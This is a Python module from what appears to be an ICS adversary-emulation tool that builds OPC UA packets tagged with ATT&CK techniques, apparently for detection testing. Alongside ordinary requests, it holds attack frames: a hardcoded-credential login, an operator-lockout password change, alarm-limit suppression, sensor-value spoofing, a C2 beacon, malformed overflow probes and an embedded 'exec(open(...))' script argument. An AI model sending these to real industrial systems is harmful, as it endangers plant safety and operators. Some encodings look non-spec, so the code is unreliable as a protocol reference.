# ICSForge OPC UA payload builder — upgraded for ATT&CK realism
# Implements real OPC UA Secure Conversation headers with distinct service types
import random
import struct

from .common import marker_bytes  # noqa: F401
from .covert_marker import covert_u32, explicit_marker

# OPC UA Service node IDs (numeric)
SVC = {
    "GetEndpoints":        428,   # discovery
    "FindServers":         422,
    "OpenSecureChannel":   446,   # T0834 Native API (raw secure channel)
    "Browse":              527,   # T0861 Point & Tag Identification
    "BrowseNext":          533,
    "Read":                631,   # T0801 Monitor Process State
    "Write":               673,   # T0831/T0836/T0855
    "Call":                712,   # T0871 Execution through API
    "CreateSession":       461,   # T0822 External Remote Services
    "ActivateSession":     467,   # T0859 Valid Accounts
    "CloseSession":        473,   # T0826 connection cleanup
    "CreateSubscription":  787,   # T0802 Automated Collection
    "Publish":             826,   # T0801 polling
    "HistoryRead":         664,   # T0879 Data Historian Compromise
    "DeleteSubscriptions": 847,   # T0815 Denial of View (kill subscription)
    "TranslateBrowsePaths":554,   # T0861 path-based tag discovery
}

# Message types
MSG_HEL = b"HEL"
MSG_ACK = b"ACK"
MSG_ERR = b"ERR"
MSG_OPN = b"OPN"
MSG_CLO = b"CLO"
MSG_MSG = b"MSG"


def _opc_header(msg_type: bytes, chunk: bytes = b"F", body: bytes = b"") -> bytes:
    """OPC UA Message Header: type(3) + chunk(1) + length(4)."""
    total = 8 + len(body)
    return msg_type + chunk + struct.pack("<I", total) + body


def _node_id(svc_id: int) -> bytes:
    """Encode a numeric NodeId for an OPC UA service request (Part 6 §5.2.2.9).

    Encoding byte selects the format:
      0x00 TwoByteNodeId  : [0x00][identifier u8]                 (ns 0, id<=255)
      0x01 FourByteNodeId : [0x01][namespace u8][identifier u16]  (id<=65535)
      0x02 NumericNodeId  : [0x02][namespace u16][identifier u32]

    Standard service request types live in namespace 0, so ids >255 (e.g.
    WriteRequest=673, ReadRequest=631) use FourByteNodeId. This is the
    dissector-correct encoding: the service id reads back exactly.
    """
    if svc_id <= 0xFF:
        return struct.pack("<BB", 0x00, svc_id)
    elif svc_id <= 0xFFFF:
        return struct.pack("<BBH", 0x01, 0x00, svc_id)
    else:
        return struct.pack("<BHI", 0x02, 0x0000, svc_id)


def _nid4(numeric: int) -> bytes:
    """FourByteNodeId for a namespace-0 numeric id used inside service bodies
    (browse roots, node ids to read/write, method/object ids). 4 bytes:
    [0x01][ns=0 u8][identifier u16]. Ids are masked to 16 bits."""
    return struct.pack("<BBH", 0x01, 0x00, numeric & 0xFFFF)


def _request_header(req_handle: int = 1) -> bytes:
    """OPC UA RequestHeader (Part 4 §7.28), spec-correct 29-byte layout:

        authenticationToken : NodeId           (null session token = 0x00 0x00)
        timestamp           : DateTime  Int64
        requestHandle       : UInt32           (covert carrier)
        returnDiagnostics   : UInt32
        auditEntryId        : String           (null = 0xFFFFFFFF)
        timeoutHint         : UInt32
        additionalHeader    : ExtensionObject  (null: NodeId 0x0000 + encoding 0x00)

    Total = 2 + 8 + 4 + 4 + 4 + 4 + 3 = 29 bytes. (The earlier version omitted
    the authenticationToken and used a 1-byte timeoutHint, leaving requestHandle
    and every following service field misaligned.)
    """
    timestamp = 132_800_000_000_000_000  # arbitrary DateTime
    return (
        b"\x00\x00"                       # authenticationToken: null TwoByteNodeId
        + struct.pack("<q", timestamp)    # timestamp (Int64)
        + struct.pack("<I", req_handle)   # requestHandle (UInt32) — covert carrier
        + struct.pack("<I", 0)            # returnDiagnostics
        + struct.pack("<I", 0xFFFFFFFF)   # auditEntryId (null String)
        + struct.pack("<I", 0)            # timeoutHint
        + b"\x00\x00\x00"                 # additionalHeader: null ExtensionObject
    )



def _parse_node_numeric(val, default=None) -> int:
    """Parse a NodeId value that may be 'ns=2;i=1001', '1001', or an int."""
    if val is None:
        return default if default is not None else random.randint(1000, 9999)
    if isinstance(val, int):
        return val
    s = str(val).strip()
    # "ns=X;i=NNN" or "i=NNN"
    if "i=" in s:
        try:
            return int(s.split("i=")[-1])
        except (ValueError, IndexError):
            pass
    # plain integer string
    try:
        return int(s)
    except ValueError:
        return default if default is not None else random.randint(1000, 9999)

def build_payload(marker: str, style: str = "hello", **kwargs) -> bytes:
    """
    Build OPC UA TCP frame.

    Styles:
      hello              HEL — T0883 initial probe / T0840 Discovery
      get_endpoints      MSG GetEndpointsRequest — T0840/T0888
      find_servers       MSG FindServersRequest — T0888 Remote System Info
      open_session       OPN + CreateSessionRequest — T0822 External Remote Services
      activate_session   MSG ActivateSessionRequest — T0859 Valid Accounts
      close_session      CLO CloseSessionRequest — T0826
      browse             MSG BrowseRequest — T0861 Point & Tag Identification
      browse_next        MSG BrowseNextRequest — T0861 continuation
      translate_paths    MSG TranslateBrowsePathsRequest — T0861
      read_value         MSG ReadRequest — T0801 Monitor Process State
      read_history       MSG HistoryReadRequest — T0879 Data Historian
      write_value        MSG WriteRequest — T0831/T0836/T0855
      call_method        MSG CallRequest — T0871 Execution through API
      create_sub         MSG CreateSubscriptionRequest — T0802
      publish            MSG PublishRequest — T0801 subscription polling
      delete_sub         MSG DeleteSubscriptionsRequest — T0815 Denial of View
    """
    rnd     = random.Random(kwargs.get("seed"))
    sc_id   = int(kwargs.get("secure_channel_id", rnd.randint(1, 0xFFFFFF)))
    token   = int(kwargs.get("security_token",    rnd.randint(1, 0xFFFFFF)))
    seq     = int(kwargs.get("sequence_number",   rnd.randint(1, 0xFFFFFF)))
    req_id  = int(kwargs.get("request_id",        rnd.randint(1, 0xFFFF)))
    _mode = kwargs.get("marker_mode", "covert" if marker else "none")
    _run = kwargs.get("run_marker", "offline")
    _idx = int(kwargs.get("pkt_index", 0))
    # OPC UA RequestHandle is a 32-bit client-chosen correlation token the
    # server echoes back — a natural covert carrier. In covert mode every
    # RequestHeader uses the keyed handle (zero added bytes).
    _covert_handle = covert_u32(_run, "opcua", _idx) if (_mode == "covert" and marker) else None
    # Explicit mode appends the compact 13-byte tag; covert/none append nothing.
    mb = explicit_marker(_run, "opcua") if (_mode == "explicit" and marker) else b""

    def _req_hdr(req_handle: int = 1) -> bytes:
        """Local RequestHeader that injects the covert handle in covert mode."""
        return _request_header(_covert_handle if _covert_handle is not None else req_handle)

    def _sym_header() -> bytes:
        """Symmetric security header (no security)."""
        return struct.pack("<II", sc_id, token)

    def _seq_header() -> bytes:
        """Sequence header."""
        return struct.pack("<II", seq, req_id)

    def _msg_body(svc_id: int, svc_payload: bytes = b"") -> bytes:
        return _sym_header() + _seq_header() + _node_id(svc_id) + _req_hdr() + svc_payload

    if style == "hello":
        dst = kwargs.get("dst_ip", "10.0.0.1")
        endpoint = kwargs.get("endpoint", f"opc.tcp://{dst}:4840").encode()
        # OPC UA HEL: version(4)+recv_buf(4)+send_buf(4)+max_msg_size(4)+max_chunk_count(4)
        # then endpoint_url as UA_String: length(4, int32) + bytes
        body = struct.pack("<IIIII", 0, 65536, 65536, 0, 0) + \
               struct.pack("<I", len(endpoint)) + endpoint + mb
        return _opc_header(MSG_HEL, b"F", body)

    elif style == "get_endpoints":
        # GetEndpointsRequest := endpointUrl(String) + localeIds[] (String array)
        # + profileUris[] (String array). Empty arrays = count 0.
        dst    = kwargs.get("dst_ip", "10.0.0.1")
        ep_url = kwargs.get("endpoint", f"opc.tcp://{dst}:4840").encode()
        payload = (struct.pack("<I", len(ep_url)) + ep_url
                   + struct.pack("<I", 0)    # localeIds = empty array
                   + struct.pack("<I", 0)    # profileUris = empty array
                   + mb)
        body    = _msg_body(SVC["GetEndpoints"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "find_servers":
        # FindServersRequest := endpointUrl(String) + localeIds[] + serverUris[].
        ep_url  = kwargs.get("endpoint", "opc.tcp://10.0.0.1:4840").encode()
        payload = (struct.pack("<I", len(ep_url)) + ep_url
                   + struct.pack("<I", 0)    # localeIds = empty array
                   + struct.pack("<I", 0)    # serverUris = empty array
                   + mb)
        body    = _msg_body(SVC["FindServers"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "open_session":
        # OPN (OpenSecureChannel) message, OPC UA Part 6 §7.1.2 / §5.5.2.
        # An OPN carries an OpenSecureChannelRequest (service 446), NOT a
        # CreateSession — CreateSession travels in a MSG after the channel is
        # open. Layout:
        #   MessageHeader(8)                       ← _opc_header
        #   SecureChannelId(4) = 0 (new channel)
        #   AsymmetricAlgorithmSecurityHeader:
        #     securityPolicyUri (String) = "...#None"
        #     senderCertificate (ByteString) = null (-1)
        #     receiverCertificateThumbprint (ByteString) = null (-1)
        #   SequenceHeader(8)
        #   OpenSecureChannelRequest:
        #     requestHeader(29) + clientProtocolVersion(u32)
        #     + securityTokenRequestType(enum u32: 0=ISSUE)
        #     + messageSecurityMode(enum u32: 1=NONE)
        #     + clientNonce(ByteString, null) + requestedLifetime(u32)
        policy_uri = b"http://opcfoundation.org/UA/SecurityPolicy#None"
        asym_hdr = (struct.pack("<I", len(policy_uri)) + policy_uri
                    + struct.pack("<I", 0xFFFFFFFF)        # senderCertificate = null
                    + struct.pack("<I", 0xFFFFFFFF))       # receiverCertThumbprint = null
        oscr = (_node_id(SVC["OpenSecureChannel"]) + _req_hdr()
                + struct.pack("<I", 0)                     # clientProtocolVersion
                + struct.pack("<I", 0)                     # securityTokenRequestType = ISSUE
                + struct.pack("<I", 1)                     # messageSecurityMode = NONE
                + struct.pack("<I", 0xFFFFFFFF)            # clientNonce = null ByteString
                + struct.pack("<I", 3600000)               # requestedLifetime (ms)
                + mb)
        opn_body = struct.pack("<I", 0) + asym_hdr + _seq_header() + oscr
        return _opc_header(MSG_OPN, b"F", opn_body)

    elif style == "activate_session":
        # ActivateSessionRequest — credential presentation (T0859). Body:
        #   clientSignature(SignatureData: algorithm String null + signature
        #   ByteString null) + clientSoftwareCertificates[] (empty) + localeIds[]
        #   (empty) + userIdentityToken(ExtensionObject) + userTokenSignature
        #   (SignatureData null). userIdentityToken = AnonymousIdentityToken
        #   wrapped: typeId nodeId(321=AnonymousIdentityToken_Encoding) +
        #   encoding(0x01 ByteString body) + body{policyId String}.
        client_sig = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)  # null alg + null sig
        anon_body  = struct.pack("<I", 4) + b"anon"     # policyId String "anon"
        user_token = (_nid4(321)                         # AnonymousIdentityToken_Encoding_DefaultBinary
                      + struct.pack("<B", 0x01)          # encoding mask: ByteString body present
                      + struct.pack("<I", len(anon_body)) + anon_body)
        user_sig   = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)  # null alg + null sig
        payload    = (client_sig
                      + struct.pack("<I", 0)             # clientSoftwareCertificates = empty
                      + struct.pack("<I", 0)             # localeIds = empty
                      + user_token
                      + user_sig
                      + mb)
        body       = _msg_body(SVC["ActivateSession"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "close_session":
        # CloseSessionRequest := deleteSubscriptions(bool).
        body = _opc_header(MSG_CLO, b"F", _sym_header() + _seq_header() +
                           _node_id(SVC["CloseSession"]) + _req_hdr() +
                           struct.pack("<B", 1) + mb)  # deleteSubscriptions = true
        return body

    elif style == "browse":
        # BrowseRequest with root node (Objects folder = ns=0;i=85).
        # BrowseDescription := nodeId + browseDirection(u32) + referenceTypeId
        # (NodeId) + includeSubtypes(bool) + nodeClassMask(u32) + resultMask(u32).
        # We keep a compact-but-valid description: root + direction + null refType
        # + includeSubtypes + nodeClassMask(all) + resultMask.
        root_node = _nid4(85)
        browse_desc = (root_node
                       + struct.pack("<I", 0)        # browseDirection = Forward
                       + b"\x00\x00"                 # referenceTypeId = null TwoByteNodeId
                       + struct.pack("<B", 1)        # includeSubtypes = true
                       + struct.pack("<I", 0xFF)     # nodeClassMask = all
                       + struct.pack("<I", 0x3F))    # resultMask = all
        # BrowseRequest := view(ViewDescription) + requestedMaxRefs(u32)
        #                  + nodesToBrowse[] (array). view = null.
        view = b"\x00\x00" + struct.pack("<q", 0) + struct.pack("<I", 0)  # null viewId + ts + viewVersion
        payload = view + struct.pack("<I", 1000) + struct.pack("<I", 1) + browse_desc + mb
        body    = _msg_body(SVC["Browse"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "browse_next":
        # BrowseNextRequest := releaseContinuationPoints(bool)
        #                      + continuationPoints[] (ByteString array).
        cont_point = bytes([rnd.randint(0, 255) for _ in range(20)])
        payload = (struct.pack("<B", 0)            # releaseContinuationPoints = false
                   + struct.pack("<I", 1)          # continuationPoints array count = 1
                   + struct.pack("<I", len(cont_point)) + cont_point
                   + mb)
        body    = _msg_body(SVC["BrowseNext"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "translate_paths":
        # TranslateBrowsePathsToNodeIdsRequest := browsePaths[] of BrowsePath.
        # BrowsePath := startingNode(NodeId) + relativePath(RelativePath).
        # RelativePath := elements[] of RelativePathElement{ referenceTypeId
        # (NodeId) + isInverse(bool) + includeSubtypes(bool) + targetName
        # (QualifiedName: nsIndex u16 + name String) }.
        target = kwargs.get("path", "PLCProgram").encode()
        rel_elem = (b"\x00\x00"                       # referenceTypeId = null
                    + struct.pack("<B", 0)            # isInverse = false
                    + struct.pack("<B", 1)            # includeSubtypes = true
                    + struct.pack("<H", 2)            # targetName nsIndex = 2
                    + struct.pack("<I", len(target)) + target)
        rel_path = struct.pack("<I", 1) + rel_elem    # elements array count = 1
        browse_path = _nid4(85) + rel_path            # startingNode = Objects folder
        payload  = struct.pack("<I", 1) + browse_path + mb   # browsePaths count = 1
        body     = _msg_body(SVC["TranslateBrowsePaths"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "read_value":
        # ReadRequest — T0801 Monitor Process State. Body:
        #   maxAge(Double) + timestampsToReturn(u32) + nodesToRead[] (ReadValueId
        #   array). ReadValueId := nodeId + attributeId(u32) + indexRange(String,
        #   null) + dataEncoding(QualifiedName, null = nsIndex u16 + null String).
        node_id = _nid4(_parse_node_numeric(kwargs.get("node_id"), rnd.randint(1000, 9999)))
        rvid = (node_id
                + struct.pack("<I", 13)            # attributeId = Value
                + struct.pack("<I", 0xFFFFFFFF)    # indexRange = null String
                + struct.pack("<H", 0) + struct.pack("<I", 0xFFFFFFFF))  # dataEncoding = null QualifiedName
        payload = (struct.pack("<d", 0.0)          # maxAge
                   + struct.pack("<I", 0)          # timestampsToReturn = Source
                   + struct.pack("<I", 1)          # nodesToRead array count = 1
                   + rvid + mb)
        body    = _msg_body(SVC["Read"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "read_history":
        # HistoryReadRequest — T0879 Data Historian Compromise
        node_id  = _nid4(_parse_node_numeric(kwargs.get("node_id"), rnd.randint(1000, 9999)))
        # HistoryReadDetails: ReadRawModifiedDetails (start/end time)
        start_ts = struct.pack("<q", 132_700_000_000_000_000)
        end_ts   = struct.pack("<q", 132_800_000_000_000_000)
        payload  = start_ts + end_ts + struct.pack("<I", 100) + node_id + mb  # max 100 values
        body     = _msg_body(SVC["HistoryRead"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "write_value":
        # WriteRequest — T0831/T0836/T0855. nodesToWrite[] of WriteValue:
        #   WriteValue := nodeId + attributeId(u32) + indexRange(String,null)
        #                 + value(DataValue). DataValue := encodingMask(Byte)
        #                 [+ Variant]. Variant for Float = builtin id 0x0A + f32.
        node_id  = _nid4(_parse_node_numeric(kwargs.get("node_id"), rnd.randint(1000, 9999)))
        variant  = struct.pack("<B", 0x0A) + struct.pack("<f", float(kwargs.get("value", rnd.uniform(0.0, 100.0))))
        data_val = struct.pack("<B", 0x01) + variant  # DataValue: value present
        write_value = (node_id
                       + struct.pack("<I", 13)           # attributeId = Value
                       + struct.pack("<I", 0xFFFFFFFF)   # indexRange = null String
                       + data_val)
        payload  = struct.pack("<I", 1) + write_value + mb   # nodesToWrite count = 1
        body     = _msg_body(SVC["Write"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "call_method":
        # CallRequest — T0871 Execution through API. methodsToCall[] of
        # CallMethodRequest := objectId + methodId + inputArguments[] (Variant
        # array; empty = count 0).
        obj_id   = _nid4(_parse_node_numeric(kwargs.get("object_id"), 85))
        meth_id  = _nid4(_parse_node_numeric(kwargs.get("method_id"), rnd.randint(1000, 9999)))
        call_req = obj_id + meth_id + struct.pack("<I", 0)  # inputArguments = empty array
        payload  = struct.pack("<I", 1) + call_req + mb     # methodsToCall count = 1
        body     = _msg_body(SVC["Call"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "create_sub":
        # CreateSubscriptionRequest := requestedPublishingInterval(Double)
        #   + requestedLifetimeCount(u32) + requestedMaxKeepAliveCount(u32)
        #   + maxNotificationsPerPublish(u32) + publishingEnabled(bool)
        #   + priority(Byte).
        payload   = (struct.pack("<d", float(kwargs.get("interval_ms", 500.0)))
                     + struct.pack("<I", 10000)   # lifetimeCount
                     + struct.pack("<I", 10)      # maxKeepAliveCount
                     + struct.pack("<I", 0)       # maxNotificationsPerPublish
                     + struct.pack("<B", 1)       # publishingEnabled = true
                     + struct.pack("<B", 0)       # priority
                     + mb)
        body      = _msg_body(SVC["CreateSubscription"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "publish":
        # PublishRequest := subscriptionAcknowledgements[] (array of
        # SubscriptionAcknowledgement). Empty = count 0.
        payload = struct.pack("<I", 0) + mb   # empty acknowledgements array
        body    = _msg_body(SVC["Publish"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "delete_sub":
        # DeleteSubscriptions — T0815 Denial of View
        sub_id  = struct.pack("<I", rnd.randint(1, 0xFFFF))
        payload = struct.pack("<I", 1) + sub_id + mb
        body    = _msg_body(SVC["DeleteSubscriptions"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "history_read":
        # HistoryReadRequest — T0811 Data from Information Repositories.
        # Same structure as read_history: ReadRawModifiedDetails (start/end ts)
        # + a nodesToRead-style node reference.
        node_id  = _nid4(rnd.randint(1000, 9999))
        start_ts = struct.pack("<q", 132_700_000_000_000_000)
        end_ts   = struct.pack("<q", 132_800_000_000_000_000)
        payload  = start_ts + end_ts + struct.pack("<I", 10) + node_id + mb
        body     = _msg_body(SVC["HistoryRead"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "activate_default":
        # ActivateSessionRequest with vendor default (anonymous) credentials —
        # T0812 Default Credentials. Valid ActivateSession body with an
        # AnonymousIdentityToken carrying policyId "anonymous".
        client_sig = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)
        anon_body  = struct.pack("<I", 9) + b"anonymous"
        user_token = _nid4(321) + struct.pack("<B", 0x01) + struct.pack("<I", len(anon_body)) + anon_body
        user_sig   = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)
        payload    = (client_sig + struct.pack("<I", 0) + struct.pack("<I", 0)
                      + user_token + user_sig + mb)
        body       = _msg_body(SVC["ActivateSession"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "activate_hardcoded":
        # ActivateSessionRequest with a known hardcoded vendor credential —
        # T0891 Hardcoded Credentials (e.g. "opcua_admin" + empty password,
        # shipped in some Kepware/ICONICS builds). UserNameIdentityToken in an
        # ExtensionObject (typeId 324 = UserNameIdentityToken_Encoding):
        #   body{ policyId String + userName String + password ByteString
        #         + encryptionAlgorithm String }.
        client_sig = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)
        user = b"opcua_admin"
        passwd = b""
        tok_body = (struct.pack("<I", 8) + b"username"        # policyId
                    + struct.pack("<I", len(user)) + user      # userName
                    + struct.pack("<I", len(passwd)) + passwd   # password ByteString
                    + struct.pack("<I", 0xFFFFFFFF))            # encryptionAlgorithm = null
        user_token = _nid4(324) + struct.pack("<B", 0x01) + struct.pack("<I", len(tok_body)) + tok_body
        user_sig   = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)
        payload    = (client_sig + struct.pack("<I", 0) + struct.pack("<I", 0)
                      + user_token + user_sig + mb)
        body    = _msg_body(SVC["ActivateSession"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "call_script":
        # CallRequest with a script argument — T0853 Scripting. CallMethodRequest
        # := objectId + methodId + inputArguments[] (Variant array). One String
        # Variant (builtin id 0x0C) carrying the script.
        obj_id  = _nid4(85)
        meth_id = _nid4(rnd.randint(100, 200))
        script  = b"exec(open('/tmp/payload.py').read())"
        arg     = struct.pack("<B", 0x0C) + struct.pack("<I", len(script)) + script  # String Variant
        call_req = obj_id + meth_id + struct.pack("<I", 1) + arg   # inputArguments count = 1
        payload = struct.pack("<I", 1) + call_req + mb             # methodsToCall count = 1
        body    = _msg_body(SVC["Call"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "file_read":
        # ReadRequest targeting a file-type node — T0893 Data from Local System.
        # OPC UA FileType nodes (UA Part 5) expose local files. Same ReadRequest
        # structure as read_value: maxAge + timestampsToReturn + ReadValueId[].
        node_id = _nid4(rnd.randint(5000, 6000))
        rvid = (node_id + struct.pack("<I", 13)            # attributeId = Value
                + struct.pack("<I", 0xFFFFFFFF)            # indexRange = null
                + struct.pack("<H", 0) + struct.pack("<I", 0xFFFFFFFF))  # dataEncoding = null
        payload = (struct.pack("<d", 0.0) + struct.pack("<I", 0)
                   + struct.pack("<I", 1) + rvid + mb)
        body    = _msg_body(SVC["Read"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "change_password":
        # ActivateSession presenting a new credential (password change that
        # locks out operators) — T0892 Change Credential. UserNameIdentityToken
        # (typeId 324) carrying the attacker's new password.
        client_sig = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)
        user = b"admin"
        passwd = b"ICSFORGE_LOCKED"
        tok_body = (struct.pack("<I", 8) + b"username"
                    + struct.pack("<I", len(user)) + user
                    + struct.pack("<I", len(passwd)) + passwd
                    + struct.pack("<I", 0xFFFFFFFF))
        user_token = _nid4(324) + struct.pack("<B", 0x01) + struct.pack("<I", len(tok_body)) + tok_body
        user_sig   = struct.pack("<I", 0xFFFFFFFF) + struct.pack("<I", 0xFFFFFFFF)
        payload = (client_sig + struct.pack("<I", 0) + struct.pack("<I", 0)
                   + user_token + user_sig + mb)
        body    = _msg_body(SVC["ActivateSession"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "write_large_blob":
        # WriteRequest with a large binary value — T0867 Lateral Tool Transfer.
        # Encodes a tool payload inside a ByteString Variant (builtin id 0x0F)
        # written to a file node.
        blob    = bytes([rnd.randint(0x20, 0x7E) for _ in range(200)])
        node_id = _nid4(rnd.randint(5000, 6000))
        variant = struct.pack("<B", 0x0F) + struct.pack("<I", len(blob)) + blob
        data_val = struct.pack("<B", 0x01) + variant
        wv = node_id + struct.pack("<I", 13) + struct.pack("<I", 0xFFFFFFFF) + data_val
        payload = struct.pack("<I", 1) + wv + mb
        body    = _msg_body(SVC["Write"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "malformed_browse":
        # BrowseRequest with excessive depth / malformed path — T0866/T0819 Exploitation
        # Crafts path depth that may trigger buffer overflow in vulnerable UA servers
        bad_path = b"\xFF" * 64  # deeply nested path identifier
        payload  = struct.pack("<I", 0xFFFFFFFF) + bad_path + mb  # maxRefs = max
        body     = _msg_body(SVC["Browse"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "relay_session":
        # OpenSecureChannel via an intermediate proxy — T0884 Connection Proxy.
        # OPN carries an OpenSecureChannelRequest (see open_session); the proxy
        # intent is reflected in the relayed endpoint/policy, not a CreateSession
        # (which would travel in a later MSG).
        policy_uri = b"http://opcfoundation.org/UA/SecurityPolicy#None"
        asym_hdr = (struct.pack("<I", len(policy_uri)) + policy_uri
                    + struct.pack("<I", 0xFFFFFFFF)
                    + struct.pack("<I", 0xFFFFFFFF))
        oscr = (_node_id(SVC["OpenSecureChannel"]) + _req_hdr()
                + struct.pack("<I", 0)            # clientProtocolVersion
                + struct.pack("<I", 0)            # securityTokenRequestType = ISSUE
                + struct.pack("<I", 1)            # messageSecurityMode = NONE
                + struct.pack("<I", 0xFFFFFFFF)   # clientNonce = null
                + struct.pack("<I", 3600000)      # requestedLifetime
                + mb)
        opn_body = struct.pack("<I", 0) + asym_hdr + _seq_header() + oscr
        return _opc_header(MSG_OPN, b"F", opn_body)

    elif style == "write_alarm_node":
        # WriteRequest to a known alarm-limit node — T0838 Modify Alarm Settings.
        # Writes an extreme value to a HighHighLimit node so the alarm never
        # fires. WriteValue with a Double Variant (builtin id 0x0B).
        node_id = _nid4(rnd.randint(2000, 3000))
        variant = struct.pack("<B", 0x0B) + struct.pack("<d", 1.0e38)
        data_val = struct.pack("<B", 0x01) + variant
        wv = node_id + struct.pack("<I", 13) + struct.pack("<I", 0xFFFFFFFF) + data_val
        payload = struct.pack("<I", 1) + wv + mb
        body    = _msg_body(SVC["Write"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "spoof_value":
        # WriteRequest injecting a false sensor value — T0856 Spoof Reporting
        # Message. WriteValue with a Float Variant (builtin id 0x0A).
        node_id = _nid4(rnd.randint(1000, 2000))
        variant = struct.pack("<B", 0x0A) + struct.pack("<f", float(kwargs.get("value", rnd.uniform(50.0, 200.0))))
        data_val = struct.pack("<B", 0x01) + variant
        wv = node_id + struct.pack("<I", 13) + struct.pack("<I", 0xFFFFFFFF) + data_val
        payload = struct.pack("<I", 1) + wv + mb
        body    = _msg_body(SVC["Write"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "c2_write":
        # WriteRequest to a custom node as a covert C2 channel — T0869 Standard
        # Application Layer Protocol. WriteValue with a ByteString Variant
        # (builtin id 0x0F) carrying the beacon.
        node_id = _nid4(rnd.randint(9900, 9999))
        beacon  = struct.pack("<I", rnd.randint(0xDEAD0000, 0xDEADFFFF))
        variant = struct.pack("<B", 0x0F) + struct.pack("<I", len(beacon)) + beacon
        data_val = struct.pack("<B", 0x01) + variant
        wv = node_id + struct.pack("<I", 13) + struct.pack("<I", 0xFFFFFFFF) + data_val
        payload = struct.pack("<I", 1) + wv + mb
        body    = _msg_body(SVC["Write"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    elif style == "native_raw":
        # Raw OPC UA secure channel open without full session negotiation —
        # T0834 Native API. Same OPN/OpenSecureChannelRequest structure as
        # open_session; compared to it this just opens the channel and stops
        # (no subsequent CreateSession/ActivateSession).
        policy_uri = b"http://opcfoundation.org/UA/SecurityPolicy#None"
        asym_hdr = (struct.pack("<I", len(policy_uri)) + policy_uri
                    + struct.pack("<I", 0xFFFFFFFF)
                    + struct.pack("<I", 0xFFFFFFFF))
        oscr = (_node_id(SVC["OpenSecureChannel"]) + _req_hdr()
                + struct.pack("<I", 0)            # clientProtocolVersion
                + struct.pack("<I", 0)            # securityTokenRequestType = ISSUE
                + struct.pack("<I", 1)            # messageSecurityMode = NONE
                + struct.pack("<I", 0xFFFFFFFF)   # clientNonce = null
                + struct.pack("<I", 3600000)      # requestedLifetime
                + mb)
        opn_body = struct.pack("<I", 0) + asym_hdr + _seq_header() + oscr
        return _opc_header(MSG_OPN, b"F", opn_body)

    elif style == "privilege_escalate":
        # ActivateSession with malformed identity token to escalate privilege — T0890
        # Oversized identity token triggering exception in auth parser
        bad_token = b"\xFF" * 48  # malformed token
        payload   = struct.pack("<I", len(bad_token)) + bad_token + mb
        body      = _msg_body(SVC["ActivateSession"], payload)
        return _opc_header(MSG_MSG, b"F", body)

    else:
        # Fallback: hello
        endpoint = b"opc.tcp://10.0.0.1:4840"
        body     = struct.pack("<IIIII", 0, 65536, 65536, 0, 0) + \
                   struct.pack("<I", len(endpoint)) + endpoint + mb
        return _opc_header(MSG_HEL, b"F", body)
